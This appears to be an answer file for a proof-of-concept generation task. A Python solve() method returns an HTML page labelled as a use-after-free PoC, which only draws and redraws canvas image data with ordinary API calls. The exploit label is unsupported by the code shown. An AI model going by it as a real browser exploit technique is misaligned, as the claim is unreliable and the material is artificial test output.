class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = r'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>UAF PoC</title>
</head>
<body>
    <canvas id="myCanvas" width="400" height="400" style="border:1px solid #000000;"></canvas>
    <script>
        var canvas = document.getElementById("myCanvas");
        var ctx = canvas.getContext("2d");
        var imageData = ctx.createImageData(400, 400);
        var data = imageData.data;
        for (var i = 0; i < data.length; i += 4) {
            data[i] = 255;
            data[i + 1] = 255;
            data[i + 2] = 255;
            data[i + 3] = 255;
        }
        ctx.putImageData(imageData, 0, 0);
        var anotherData = ctx.createImageData(200, 200);
        ctx.putImageData(anotherData, 100, 100);
        data[0] = 0;
        ctx.putImageData(imageData, 0, 0);
    </script>
</body>
</html>'''
        return poc.encode('utf-8')
